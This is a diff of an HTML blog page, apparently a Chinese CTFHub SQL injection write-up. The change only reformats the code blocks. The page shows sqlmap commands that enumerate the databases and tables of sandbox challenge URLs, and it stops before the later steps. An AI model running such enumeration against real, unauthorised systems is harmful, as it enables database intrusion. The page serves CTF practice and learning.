@@ -479,11 +479,16 @@ sqlmap支持">
 <p>4、联合查询注入，可以使用union的情况下的注入。</p>
 <p>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
 <p>1、列出数据库</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://challenge-493b66302b18faed.sandbox.ctfhub.com:10800/?id=1 --dbs</span><br><span class="line">-u：目标URL</span><br><span class="line">--dbs：枚举数据库</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">python sqlmap.py -u http://challenge-493b66302b18faed.sandbox.ctfhub.com:10800/?id=1 --dbs
+-u：目标URL
+--dbs：枚举数据库
+</code></pre>
 <p>2、列出目标数据库的表</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://challenge-9d044ad1c2acaeba.sandbox.ctfhub.com:10800/?id=1 -D sqli(数据库名) </span><br><span class="line">--tables</span><br><span class="line">-D 指定数据库</span><br><span class="line">--tables 列举该数据库中的所有表</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">python sqlmap.py -u http://challenge-9d044ad1c2acaeba.sandbox.ctfhub.com:10800/?id=1 -D sqli(数据库名) 
+--tables
+-D 指定数据库
+--tables 列举该数据库中的所有表
+</code></pre>
 <p>3、</p>
 <p>未完待续。</p>
 <h3 id="参考资料：-24条消息-CTFHub-SQl注入-时间盲注（sqlmap）-chichengfengxue的博客-CSDN博客-时间盲注sqlmap"><a href="#参考资料：-24条消息-CTFHub-SQl注入-时间盲注（sqlmap）-chichengfengxue的博客-CSDN博客-时间盲注sqlmap" class="headerlink" title="参考资料：(24条消息) CTFHub SQl注入 时间盲注（sqlmap）_chichengfengxue的博客-CSDN博客_时间盲注sqlmap"></a>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/chichengfengxue/article/details/119490239">(24条消息) CTFHub SQl注入 时间盲注（sqlmap）_chichengfengxue的博客-CSDN博客_时间盲注sqlmap</a></h3>
